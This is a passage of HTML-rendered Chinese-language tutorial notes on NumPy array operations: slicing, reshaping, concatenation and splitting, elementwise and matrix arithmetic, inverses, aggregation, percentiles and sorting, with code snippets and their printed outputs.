<span class="number">0</span>]])</span><br><span class="line">X[::-<span class="number">2</span>] --&gt; <span class="comment">##倒着输出两行</span></span><br><span class="line">array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>]])</span><br></pre></td></tr></table></figure><blockquote><p>numpy分片没有创建新矩阵，修改子矩阵会修改原矩阵</p></blockquote><p>构造不相关的子矩阵，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subX = X[:<span class="number">2</span>, :<span class="number">3</span>].copy()</span><br></pre></td></tr></table></figure><h2 id="Reshape升维"><a href="#Reshape升维" class="headerlink" title="Reshape升维"></a>Reshape升维</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">10</span>)</span><br><span class="line">x.shape --&gt; (<span class="number">10</span>,)</span><br><span class="line">x.reshape(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">--&gt;array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line">B = x.reshape(<span class="number">1</span>, <span class="number">10</span>) --&gt; array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line">B.shape --&gt; (<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">x.reshape(<span class="number">10</span>, -<span class="number">1</span>) <span class="comment">## 只划分10行，不关心每行几个元素</span></span><br><span class="line">--&gt; array([[<span class="number">0</span>],</span><br><span class="line">       [<span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>],</span><br><span class="line">       [<span class="number">6</span>],</span><br><span class="line">       [<span class="number">7</span>],</span><br><span class="line">       [<span class="number">8</span>],</span><br><span class="line">       [<span class="number">9</span>]])</span><br><span class="line">x.reshape(-<span class="number">1</span>, <span class="number">5</span>) <span class="comment">## 只划分5列，不关心有几行</span></span><br></pre></td></tr></table></figure><h1 id="矩阵的合并与分割"><a href="#矩阵的合并与分割" class="headerlink" title="矩阵的合并与分割"></a>矩阵的合并与分割</h1><h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">y = np.array([<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="向量合并"><a href="#向量合并" class="headerlink" title="向量合并"></a>向量合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.concatenate([x,y])</span><br><span class="line">--&gt; array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="二维数组合并"><a href="#二维数组合并" class="headerlink" title="二维数组合并"></a>二维数组合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">             [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">             </span><br><span class="line">--&gt; array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="comment"># 一个样本增加一个样本</span></span><br><span class="line">np.concatenate([A,A])</span><br><span class="line"><span class="comment"># 一个样本增加一个特征</span></span><br><span class="line">np.concatenate([A, A], axis=<span class="number">1</span>)     </span><br><span class="line">--&gt; array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>axis默认为0，表示竖着拼接；axis=1 表示沿着第二个维度进行拼接（横着拼接）</p></blockquote><h3 id="跨维度合并"><a href="#跨维度合并" class="headerlink" title="跨维度合并"></a>跨维度合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z = np.array([<span class="number">666</span>,<span class="number">666</span>,<span class="number">666</span>])</span><br><span class="line">A2 = np.concatenate([A, z.reshape(<span class="number">1</span>,-<span class="number">1</span>)])</span><br></pre></td></tr></table></figure><h3 id="垂直方向进行叠加"><a href="#垂直方向进行叠加" class="headerlink" title="垂直方向进行叠加"></a>垂直方向进行叠加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.vstack([A,z])</span><br><span class="line">--&gt; array([[  <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>],</span><br><span class="line">       [  <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>],</span><br><span class="line">       [<span class="number">666</span>, <span class="number">666</span>, <span class="number">666</span>]])</span><br></pre></td></tr></table></figure><h3 id="水平方向进行叠加"><a href="#水平方向进行叠加" class="headerlink" title="水平方向进行叠加"></a>水平方向进行叠加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B = np.full((<span class="number">2</span>,<span class="number">2</span>), <span class="number">100</span>)</span><br><span class="line">--&gt;</span><br><span class="line">array([[<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">       [<span class="number">100</span>, <span class="number">100</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.hstack([A, B])</span><br><span class="line">--&gt;</span><br><span class="line">array([[  <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>, <span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">       [  <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>, <span class="number">100</span>, <span class="number">100</span>]])</span><br></pre></td></tr></table></figure><h3 id="分割操作"><a href="#分割操作" class="headerlink" title="分割操作"></a>分割操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line">x1, x2, x3  = np.split(x, [<span class="number">3</span>,<span class="number">7</span>])</span><br><span class="line">(array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]), array([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]), array([<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]))</span><br></pre></td></tr></table></figure><h3 id="多维默认以行分割"><a href="#多维默认以行分割" class="headerlink" title="多维默认以行分割"></a>多维默认以行分割</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A1, A2 = np.split(A, [<span class="number">2</span>])</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]]),</span><br><span class="line"> array([[ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]]))</span><br><span class="line">upper, lower = np.vsplit(A, [<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h4 id="以列分割"><a href="#以列分割" class="headerlink" title="以列分割"></a>以列分割</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A1, A2 = np.split(A, [<span class="number">2</span>], axis=<span class="number">1</span>)</span><br><span class="line">(array([[ <span class="number">0</span>,  <span class="number">1</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">        [<span class="number">12</span>, <span class="number">13</span>]]),</span><br><span class="line"> array([[ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">15</span>]]))</span><br><span class="line">left, right = np.hsplit(A, [<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h1 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h1><p>给定一个向量，让向量中每一个数乘以2</p><p><code>a = (0,1,2)</code></p><p><code>a*2 = (0,2,4)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">10</span></span><br><span class="line">L = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br></pre></td></tr></table></figure><p>方法1：list</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A = [2*e for e in L]</span><br><span class="line">--&gt;</span><br><span class="line">[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]</span><br></pre></td></tr></table></figure><p>方法2：numpy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">L = np.arange(n)</span><br><span class="line">A = np.array(e*<span class="number">2</span> <span class="keyword">for</span> e <span class="keyword">in</span> L) <span class="comment">#或者</span></span><br><span class="line">A = <span class="number">2</span> * L</span><br></pre></td></tr></table></figure><h2 id="Universal-Functions"><a href="#Universal-Functions" class="headerlink" title="Universal Functions"></a>Universal Functions</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = np.arange(<span class="number">1</span>,<span class="number">16</span>).reshape((<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运算+-*/(浮点除)//(整数除)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求余</span></span><br><span class="line">X % <span class="number">2</span></span><br><span class="line"><span class="comment"># 取倒数</span></span><br><span class="line"><span class="number">1</span> / X</span><br><span class="line">array([[<span class="number">1.</span>        , <span class="number">0.5</span>       , <span class="number">0.33333333</span>, <span class="number">0.25</span>      , <span class="number">0.2</span>       ],</span><br><span class="line">       [<span class="number">0.16666667</span>, <span class="number">0.14285714</span>, <span class="number">0.125</span>     , <span class="number">0.11111111</span>, <span class="number">0.1</span>       ],</span><br><span class="line">       [<span class="number">0.09090909</span>, <span class="number">0.08333333</span>, <span class="number">0.07692308</span>, <span class="number">0.07142857</span>, <span class="number">0.06666667</span>]])</span><br><span class="line"><span class="comment"># 取绝对值</span></span><br><span class="line">np.<span class="built_in">abs</span>(X)</span><br><span class="line"><span class="comment"># 取正弦函数cos，tan同</span></span><br><span class="line">np.sin(X)</span><br><span class="line"><span class="comment"># 取e的X方</span></span><br><span class="line">np.exp(X)</span><br><span class="line"><span class="comment"># 取3的X次方</span></span><br><span class="line">np.power(<span class="number">3</span>,X)</span><br><span class="line"><span class="comment"># 取log以e为底</span></span><br><span class="line">np.log(X)</span><br><span class="line"><span class="comment"># 取log以2为底</span></span><br></pre></td></tr></table></figure><h2 id="矩阵对应元素做运算"><a href="#矩阵对应元素做运算" class="headerlink" title="矩阵对应元素做运算"></a>矩阵对应元素做运算</h2><p>加减乘除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A = np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">B = np.full((<span class="number">2</span>,<span class="number">2</span>),<span class="number">10</span>)</span><br><span class="line">A,B</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>]]),</span><br><span class="line"> array([[<span class="number">10</span>, <span class="number">10</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">10</span>]]))</span><br><span class="line">A * B</span><br><span class="line">array([[ <span class="number">0</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">30</span>]])</span><br></pre></td></tr></table></figure><h3 id="标准矩阵乘法"><a href="#标准矩阵乘法" class="headerlink" title="标准矩阵乘法"></a>标准矩阵乘法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A.dot(B)       </span><br><span class="line">array([[<span class="number">10</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">50</span>, <span class="number">50</span>]])</span><br></pre></td></tr></table></figure><h3 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A.T</span><br><span class="line">array([[0, 2],</span><br><span class="line">       [1, 3]])</span><br></pre></td></tr></table></figure><h2 id="向量和矩阵之间的运算"><a href="#向量和矩阵之间的运算" class="headerlink" title="向量和矩阵之间的运算"></a>向量和矩阵之间的运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v = np.array([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">v--&gt;array([<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">A--&gt;</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>]])</span><br></pre></td></tr></table></figure><h3 id="加法：向量和矩阵中的每个行做加法"><a href="#加法：向量和矩阵中的每个行做加法" class="headerlink" title="加法：向量和矩阵中的每个行做加法"></a>加法：向量和矩阵中的每个行做加法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v+A</span><br><span class="line">array([[<span class="number">1</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">5</span>]])</span><br><span class="line"><span class="comment">#等同</span></span><br><span class="line">np.vstack([v] * A.shape[<span class="number">0</span>]) +A</span><br></pre></td></tr></table></figure><h4 id="向量堆叠tile"><a href="#向量堆叠tile" class="headerlink" title="向量堆叠tile"></a>向量堆叠tile</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.tile(v,[<span class="number">2</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="乘法：矩阵的每个元素和向量每个元素相乘再相加"><a href="#乘法：矩阵的每个元素和向量每个元素相乘再相加" class="headerlink" title="乘法：矩阵的每个元素和向量每个元素相乘再相加"></a>乘法：矩阵的每个元素和向量每个元素相乘再相加</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v.dot(A)</span><br><span class="line">array([4, 7])</span><br><span class="line">A.dot(v) #将v转换2x1的矩阵</span><br><span class="line">array([2, 8])</span><br></pre></td></tr></table></figure><h2 id="矩阵的逆"><a href="#矩阵的逆" class="headerlink" title="矩阵的逆"></a>矩阵的逆</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">invA = np.linalg.inv(A)</span><br><span class="line">array([[-<span class="number">1.5</span>,  <span class="number">0.5</span>],</span><br><span class="line">       [ <span class="number">1.</span> ,  <span class="number">0.</span> ]])</span><br><span class="line">A.dot(invA) <span class="comment">#得到单位矩阵</span></span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br><span class="line">invA.dot(A)</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure><blockquote><p>矩阵一定要是方阵才有逆矩阵</p></blockquote><h3 id="伪逆矩阵"><a href="#伪逆矩阵" class="headerlink" title="伪逆矩阵"></a>伪逆矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">16</span>).reshape(<span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">np.linalg.pinv(x)</span><br><span class="line">array([[-<span class="number">1.35416667e-01</span>,  <span class="number">5.20833333e-02</span>],</span><br><span class="line">       [-<span class="number">1.01190476e-01</span>,  <span class="number">4.16666667e-02</span>],</span><br><span class="line">       [-<span class="number">6.69642857e-02</span>,  <span class="number">3.12500000e-02</span>],</span><br><span class="line">       [-<span class="number">3.27380952e-02</span>,  <span class="number">2.08333333e-02</span>],</span><br><span class="line">       [ <span class="number">1.48809524e-03</span>,  <span class="number">1.04166667e-02</span>],</span><br><span class="line">       [ <span class="number">3.57142857e-02</span>, -<span class="number">4.96086088e-18</span>],</span><br><span class="line">       [ <span class="number">6.99404762e-02</span>, -<span class="number">1.04166667e-02</span>],</span><br><span class="line">       [ <span class="number">1.04166667e-01</span>, -<span class="number">2.08333333e-02</span>]])</span><br><span class="line">x.dot(pinvx)</span><br><span class="line">array([[ <span class="number">1.00000000e+00</span>, -<span class="number">2.60208521e-16</span>],</span><br><span class="line">       [ <span class="number">9.71445147e-17</span>,  <span class="number">1.00000000e+00</span>]])</span><br></pre></td></tr></table></figure><h1 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a>聚合操作</h1><p>把一组值变成一个值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,-<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br><span class="line"><span class="comment"># 最大值</span></span><br><span class="line">np.<span class="built_in">max</span>(x)</span><br><span class="line"><span class="comment"># 最小值</span></span><br><span class="line">np.<span class="built_in">min</span>(x)</span><br><span class="line"><span class="comment"># 求乘积</span></span><br><span class="line">np.prod(x)</span><br><span class="line"><span class="comment"># 平均值</span></span><br><span class="line">np.mean(x)</span><br><span class="line"><span class="comment"># 中位数</span></span><br><span class="line">np.median(x)</span><br><span class="line"><span class="comment"># 方差</span></span><br><span class="line">np.var(x)</span><br><span class="line"><span class="comment"># 标准差</span></span><br><span class="line">np.std(x)</span><br></pre></td></tr></table></figure><h2 id="求和"><a href="#求和" class="headerlink" title="求和"></a>求和</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.sum(x)</span><br></pre></td></tr></table></figure><p>求每一列的和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.<span class="built_in">sum</span>(x, axis=<span class="number">0</span>) --&gt;</span><br><span class="line">array([<span class="number">24</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">36</span>])</span><br></pre></td></tr></table></figure><p>求每一行的和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.<span class="built_in">sum</span>(x, axis=<span class="number">1</span>) --&gt;</span><br><span class="line">array([ <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>])</span><br></pre></td></tr></table></figure><h2 id="百分位点求值"><a href="#百分位点求值" class="headerlink" title="百分位点求值"></a>百分位点求值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">np.percentile(x,q=<span class="number">50</span>)</span><br><span class="line"><span class="number">7.5</span></span><br><span class="line"><span class="keyword">for</span> percent <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>]:</span><br><span class="line">    <span class="built_in">print</span>(np.percentile(x,q=percent))</span><br><span class="line"><span class="number">0.0</span></span><br><span class="line"><span class="number">3.75</span></span><br><span class="line"><span class="number">7.5</span></span><br><span class="line"><span class="number">11.25</span></span><br><span class="line"><span class="number">15.0</span></span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new = np.random.normal(<span class="number">0</span>,<span class="number">1</span>, size=<span class="number">10</span>)</span><br><span class="line">np.<span class="built_in">min</span>(new)</span><br><span class="line">--&gt; -<span class="number">1.2581554274500057</span></span><br><span class="line">np.argmin(new)</span><br><span class="line">--&gt; <span class="number">1</span></span><br><span class="line">new[<span class="number">1</span>]</span><br><span class="line">--&gt; -<span class="number">1.2581554274500057</span></span><br></pre></td></tr></table></figure><h3 id="排序使用索引"><a href="#排序使用索引" class="headerlink" title="排序使用索引"></a>排序使用索引</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">16</span>)</span><br><span class="line">np.random.shuffle(x)</span><br><span class="line"><span class="comment"># 返回排序后结果</span></span><br><span class="line">np.sort(x)</span><br><span class="line"><span class="comment"># 将x排序</span></span><br><span class="line">x.sort()</span><br></pre></td></tr></table></figure><p>按照索引有序排列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.argsort(x)</span><br></pre></td></tr></table></figure><p>标定点（标定点前都比他小，后都比他大）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.partition(x,<span class="number">7</span>)</span><br><span class="line">array([ <span class="number">1</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">7</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">11</span>])</span><br><span class="line">np.argpartition(x,<span class="number">7</span>) 索引对应的值比<span class="number">7</span>小或者比<span class="number">7</span>大</span><br></pre></td></tr></table></figure><h3 id="矩阵排序"><a href="#矩阵排序" class="headerlink" title="矩阵排序"></a>矩阵排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 